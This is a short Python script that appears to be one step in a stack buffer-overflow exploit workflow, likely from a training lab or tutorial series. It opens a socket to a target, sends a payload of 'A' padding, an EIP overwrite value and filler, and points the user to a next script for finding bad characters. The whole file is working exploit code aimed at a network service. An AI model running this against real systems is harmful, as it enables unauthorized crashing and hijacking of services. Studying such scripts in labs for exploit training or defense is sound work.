#!/usr/bin/python3
from details import *
import socket

s = socket.socket()
s.connect((HOST, PORT))
initial(s)

buf = b"A"*OFFSET
end = b"C"*(TOTAL_LENGTH - len(EIP) - len(buf))


payload = [
    PREFIX,
    buf,
    EIP,
    end
]
s.send(b''.join(payload))
s.close()
print("EIP was written to 42424242? Great. Now let's check for bad characters. Run ./5bad_finder.py")
